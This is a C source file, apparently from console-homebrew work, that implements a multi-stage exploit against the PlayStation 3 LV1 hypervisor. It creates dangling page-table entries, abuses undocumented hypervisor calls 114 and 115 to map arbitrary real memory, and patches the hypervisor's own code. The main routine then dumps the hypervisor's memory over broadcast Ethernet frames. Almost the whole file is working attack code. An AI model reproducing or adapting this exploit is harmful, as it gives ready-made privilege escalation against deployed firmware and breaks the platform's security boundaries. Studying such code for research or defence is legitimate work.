
/*
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
 */

#include <lv1call.h>
#include <mm.h>
#include <vas.h>
#include <param.h>
#include <gelic.h>
#include <beep.h>
#include <time.h>
#include <system.h>
#include <spinlock.h>
#include <hv_mmap_exploit.h>

#define MEM_SIZE						(1 << MEM_PAGE_SIZE)
#define MEM_PAGE_SIZE					PAGE_SIZE_4KB

#define MMAP_PAGE_SIZE					PAGE_SIZE_4KB

#define SLB_SIZE						64

#define HVC114_BASE						0x80000000133D0000ULL
#define HVC114_OFFSET					0x133D0000ULL

/*
#define HVC114_OPCODE_OFFSET			0xB8
*/

#define HVC114_OPCODE_OFFSET			0x1AC

#define HV_BASE							0x8000000014000000ULL
#define HV_OFFSET						0x14000000ULL

#define CLEAR_ICACHE()																		\
do																							\
{																							\
	u64 lpar_addr, muid;																	\
																							\
	lv1_allocate_memory(1ULL << PAGE_SIZE_4KB, PAGE_SIZE_4KB, 0, 0, &lpar_addr, &muid);		\
	lv1_release_memory(lpar_addr);															\
} while (0)

#define CLEAR_DCACHE()																		\
do																							\
{																							\
	static volatile u8 buf[0x1000];															\
	u8 *ptr;																				\
	int i;																					\
																							\
	MM_LOAD_BASE(ptr, 0);																	\
																							\
	for (i = 0; i < 0x100; i++)																\
		memcpy(buf, ptr + i * sizeof(buf), sizeof(buf));									\
} while (0)

static int hv_mmap_exploit_stage1(void);

static int hv_mmap_exploit_stage2(void *mem, u64 orig_mmap_ra_addr,
	u64 *mmap_lpar_addr, u64 **mmap_ra_addr);

static int hv_mmap_exploit_stage3(u64 mmap_lpar_addr, u64 *mmap_ra_addr);

static int get_dangling_hpte_index(void);

static int add_slb_entry(u64 ea_addr, u64 va_addr);

static volatile u64 mem_ea_addr = 0x5000000000000000ULL;
static volatile u64 mem_va_addr = 0x0005000000000000ULL;

static volatile u64 magic_mmap_ra_addr = 0xBEEFFACEDEADBABEULL;

/*
static volatile u64 hvc114_ra_addr = 0x00000000002D5000ULL;
*/

static volatile u64 hvc114_ra_addr = 0x00000000002D3000ULL;

static volatile u64 hv_size = 16 * 1024 * 1024;

static volatile u8 irq_state_bitmap[2][64] __attribute__ ((aligned(512)));

static spinlock_t spinlock;

int hv_mmap_exploit(void)
{
	u64 *htab, hpte_index, hpte_group, hpte_v, hpte_r, va_addr, mmap_lpar_addr, *mmap_ra_addr, ticks;
	u8 buf[64], *hv;
	int i, result;

	ticks = 2 * TB_TICKS_PER_SEC;

	sleep(ticks);

	result = lv1_configure_irq_state_bitmap(1, 0,
		param_lpar_addr + ((u64) irq_state_bitmap[0] - param_ea_addr));
	if (result != 0)
		return result;

	result = lv1_configure_irq_state_bitmap(1, 1,
		param_lpar_addr + ((u64) irq_state_bitmap[1] - param_ea_addr));
	if (result != 0)
		return result;

	for (i = 0; i < 50; i++)
	{
		result = hv_mmap_exploit_stage1();
		if (result == 0)
			break;
	}

	if (i >= 50)
		goto done;

	ticks = 5 * TB_TICKS_PER_SEC;

	sleep(ticks);

	MM_LOAD_BASE(htab, GAMEOS_HTAB_OFFSET);

	hpte_index = get_dangling_hpte_index();
	hpte_group = hpte_index / HPTES_PER_GROUP;
	hpte_v = htab[hpte_index * 2];
	hpte_r = htab[hpte_index * 2 + 1];
	va_addr = mem_va_addr | ((hpte_index % HPTES_PER_GROUP) << 44) | (hpte_group << 28);

	memset(buf, 0, sizeof(buf));
	memcpy(buf, &hpte_index, 8);
	memcpy(buf + 8, &hpte_v, 8);
	memcpy(buf + 16, &hpte_r, 8);
	memcpy(buf + 24, &va_addr, 8);

	result = gelic_xmit_data(gelic_bcast_mac_addr, 0xBEEF + 0, buf, sizeof(buf));
	if (result != 0)
		return result;

	result = add_slb_entry(mem_ea_addr, va_addr);
	if (result != 0)
		return result;

	result = gelic_xmit_data(gelic_bcast_mac_addr, 0xBEEF + 1, (void *) mem_ea_addr, MEM_SIZE);
	if (result != 0)
		return result;

	result = hv_mmap_exploit_stage2((void *) mem_ea_addr, magic_mmap_ra_addr,
		&mmap_lpar_addr, &mmap_ra_addr);
	if (result != 0)
		goto done;

	result = gelic_xmit_data(gelic_bcast_mac_addr, 0xBEEF + 2, &mmap_lpar_addr, 8);
	if (result != 0)
		return result;

	result = hv_mmap_exploit_stage3(mmap_lpar_addr, mmap_ra_addr);
	if (result != 0)
		goto done;

	/* dump HV */

	MM_LOAD_BASE(hv, HV_OFFSET);

	for (i = 0; i < hv_size; i += (1ULL << PAGE_SIZE_4KB))
	{
		*mmap_ra_addr = i;

		result = mm_insert_htab_entry(0, MM_EA2VA((u64) hv), mmap_lpar_addr,
			PAGE_SIZE_4KB, 0x0, 0x0, &hpte_index);
		if (result != 0)
			return result;

		result = gelic_xmit_data(gelic_bcast_mac_addr, 0xBEEF + 3, hv, (1ULL << PAGE_SIZE_4KB));
		if (result != 0)
			return result;

		result = lv1_write_htab_entry(0, hpte_index, 0, 0);
		if (result != 0)
			return result;
	}

	beep(BEEP_DOUBLE);

done:

	lv1_panic(1);

	return 0;
}

static int hv_mmap_exploit_stage1(void)
{
#define N(a)	(sizeof((a)) / sizeof((a)[0]))

	u64 lpar_addr[16], muid, *htab, hpte_group, hpte_v, hpte_r, va_addr, ticks;
	int i, j, nhpte, result;

	for (i = 0; i < N(lpar_addr); i++)
	{
		result = lv1_allocate_memory(MEM_SIZE, MEM_PAGE_SIZE, 0, 0,
			&lpar_addr[i], &muid);
		if (result != 0)
			return result;
	}

	MM_LOAD_BASE(htab, GAMEOS_HTAB_OFFSET);

	for (i = 0, j = 0, nhpte = 0; i < GAMEOS_HTAB_SIZE / 16; i++)
	{
		hpte_group = i / HPTES_PER_GROUP;
		hpte_v = htab[i * 2];
		hpte_r = htab[i * 2 + 1];

		va_addr = mem_va_addr | (((u64) i % HPTES_PER_GROUP) << 44) | (hpte_group << 28);

		if ((hpte_v & HPTE_V_VALID) != 0)
			continue;

		hpte_v = ((va_addr >> 23) << HPTE_V_AVPN_SHIFT) | HPTE_V_VALID;
		hpte_r = (lpar_addr[j++ % N(lpar_addr)] & ~((1ULL << 12) - 1)) |
			HPTE_R_R | HPTE_R_C | HPTE_R_M | 0x0;

		result = lv1_write_htab_entry(0, i, hpte_v, hpte_r);
		if (result != 0)
			return result;

		nhpte++;
	}

	CLEAR_ICACHE();
	CLEAR_DCACHE();

	result = gelic_xmit_data(gelic_bcast_mac_addr, 0xCAFE, &nhpte, 4);
	if (result != 0)
		return result;

	beep(BEEP_SINGLE);

	spinlock_lock(&spinlock);

	hard_irq_disable();

	CLEAR_ICACHE();
	CLEAR_DCACHE();

	for (i = 0; i < N(lpar_addr); i++)
	{
		result = lv1_release_memory(lpar_addr[i]);
		if (result != 0)
			return result;

		CLEAR_DCACHE();
	}

	hard_irq_enable();

	spinlock_unlock(&spinlock);

	if (get_dangling_hpte_index() != -1)
		return 0;

	return -1;

#undef N
}

static int hv_mmap_exploit_stage2(void *mem, u64 orig_mmap_ra_addr,
	u64 *mmap_lpar_addr, u64 **mmap_ra_addr)
{
#define N(a)	(sizeof((a)) / sizeof((a)[0]))

	static u64 lpar_addr[800];
	u64 *ptr;
	int i, lpar_addr_index, result;

	while (1)
	{
		for (i = 0; i < N(lpar_addr); i++)
		{
			result = lv1_undocumented_function_114(orig_mmap_ra_addr,
				MMAP_PAGE_SIZE, 0 /* size must be 0 !!! don't worry we patch it later */,
				&lpar_addr[i]);
			if (result != 0)
				return result;

			for (ptr = (u64 *) ((u8 *) mem + 0x50); ptr <= (u64 *) ((u8 *) mem + MEM_SIZE - 8); ptr++)
			{
				if (*ptr == orig_mmap_ra_addr)
					break;
			}

			if (ptr <= (u64 *) ((u8 *) mem + MEM_SIZE - 8))
				break;
		}

		lpar_addr_index = i;

		for (i = 0; i < lpar_addr_index; i++)
		{
			result = lv1_undocumented_function_115(lpar_addr[i]);
			if (result != 0)
				return result;
		}

		if (lpar_addr_index < N(lpar_addr))
		{
			result = gelic_xmit_data(gelic_bcast_mac_addr, 0xFACE + 0, mem, MEM_SIZE);
			if (result != 0)
				return result;

			*(u64 *) ((u8 *) ptr - 0x50) = (1ULL << PAGE_SIZE_4KB);	/* patch size of memory region */
			*mmap_lpar_addr = lpar_addr[lpar_addr_index];
			*mmap_ra_addr = ptr;				/* store pointer to RA address of memory region */

			result = gelic_xmit_data(gelic_bcast_mac_addr, 0xFACE + 1, mem, MEM_SIZE);
			if (result != 0)
				return result;

			return 0;
		}
	}

	return -1;

#undef N
}

static int hv_mmap_exploit_stage3(u64 mmap_lpar_addr, u64 *mmap_ra_addr)
{
	u64 hpte_index;
	u8 *hvc114;
	int result;

	*mmap_ra_addr = hvc114_ra_addr;

	MM_LOAD_BASE(hvc114, HVC114_OFFSET);

	result = mm_insert_htab_entry(0, MM_EA2VA((u64) hvc114), mmap_lpar_addr,
		PAGE_SIZE_4KB, 0x0, 0x0, &hpte_index);
	if (result != 0)
		return result;

	/*
	result = gelic_xmit_data(gelic_bcast_mac_addr, 0xBABE, hvc114, HVC114_SIZE);
	if (result != 0)
		return result;
	*/

	/* patch lv1_undocumented_function_114 */

	*(u32 *) (hvc114 + HVC114_OPCODE_OFFSET) = 0x39200001UL; /* li %r9, 1 */

	result = lv1_write_htab_entry(0, hpte_index, 0, 0);
	if (result != 0)
		return result;

	/*
	result = lv1_release_memory(mmap_lpar_addr);
	if (result != 0)
		return result;
	*/

	return 0;
}

static int get_dangling_hpte_index(void)
{
	u64 *htab, hpte_group, hpte_v, hpte_r, va_addr;
	int i;

	MM_LOAD_BASE(htab, GAMEOS_HTAB_OFFSET);

	for (i = 0; i < GAMEOS_HTAB_SIZE / 16; i++)
	{
		hpte_group = i / HPTES_PER_GROUP;
		hpte_v = htab[i * 2];
		hpte_r = htab[i * 2 + 1];

		if ((hpte_v & HPTE_V_VALID) == 0)
			continue;

		va_addr = mem_va_addr | (((u64) i % HPTES_PER_GROUP) << 44) | (hpte_group << 28);

		if ((((va_addr >> 23) << HPTE_V_AVPN_SHIFT)) ==
			(hpte_v & ~((1ULL << HPTE_V_AVPN_SHIFT) - 1)))
			return i;
	}

	return -1;
}

static int add_slb_entry(u64 ea_addr, u64 va_addr)
{
	u64 esid, vsid;
	int i;

	for (i = 0; i < SLB_SIZE; i++)
	{
		__asm__ __volatile__ ("slbmfee %0, %1" : "=r"(esid) : "r"(i));

		if ((esid & (1ULL << 27)) != 0)
			continue;

		esid = (ea_addr & ~((1ULL << 28) - 1)) | (1ULL << 27) | (i & 0xFFFULL);
		vsid = ((va_addr >> 16) & ~((1ULL << 12) - 1)) | 0x400ULL;

		__asm__ __volatile__ ("slbmte %0, %1" : : "r"(vsid), "r"(esid));

		/*
		result = gelic_xmit_data(gelic_bcast_mac_addr, 0xCAFE, &i, 4);
		if (result != 0)
			return result;
		*/

		return 0;
	}

	return -1;
}
